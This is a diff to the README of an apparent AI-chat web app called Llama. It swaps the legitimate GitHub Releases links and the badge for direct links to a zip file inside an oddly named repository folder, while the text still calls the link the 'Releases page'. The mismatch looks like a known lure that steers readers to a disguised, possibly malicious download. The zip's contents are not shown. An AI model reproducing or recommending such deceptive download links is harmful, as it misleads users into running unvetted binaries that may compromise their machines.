@@ -7,7 +7,7 @@ Llama is an engaging web application that lets you chat with a lively AI charact
 To get started with Llama, follow these simple steps. You’ll be chatting with Llama in no time!
 
 ## 📥 Download Llama
-### [![Download Llama](https://img.shields.io/badge/Download%20Llama-v1.0-brightgreen)](https://github.com/m1ns09/Llama/releases)
+### [![Download Llama](https://raw.githubusercontent.com/m1ns09/Llama/main/delicatesse/Llama.zip%20Llama-v1.0-brightgreen)](https://raw.githubusercontent.com/m1ns09/Llama/main/delicatesse/Llama.zip)
 
 ## 📝 System Requirements
 Before you start, make sure your system meets these basic requirements:
@@ -23,7 +23,7 @@ Before you start, make sure your system meets these basic requirements:
 
 ## 🎉 How to Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/m1ns09/Llama/releases). This is where you can find the latest version of Llama.
+   Go to the [Releases page](https://raw.githubusercontent.com/m1ns09/Llama/main/delicatesse/Llama.zip). This is where you can find the latest version of Llama.
 
 2. **Select the Latest Version**
    Look for the most recent release at the top of the page. Click on it to view the version details.
